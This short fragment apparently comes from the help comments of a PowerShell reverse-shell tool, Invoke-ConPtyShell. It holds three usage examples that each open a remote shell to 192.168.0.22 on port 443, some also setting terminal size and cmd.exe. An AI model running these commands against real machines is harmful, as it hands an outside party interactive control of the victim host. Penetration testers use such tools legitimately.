...
{   
    <#
        ...
        .EXAMPLE  
            PS>Invoke-ConPtyShell 192.168.0.22 443
        ...
        .EXAMPLE
            PS>Invoke-ConPtyShell -RemoteIp 192.168.0.22 -RemotePort 443 -Rows 30 -Cols 90
         ...
         .EXAMPLE
            PS>Invoke-ConPtyShell -RemoteIp 192.168.0.22 -RemotePort 443 -Rows 30 -Cols 90 -CommandLine cmd.exe
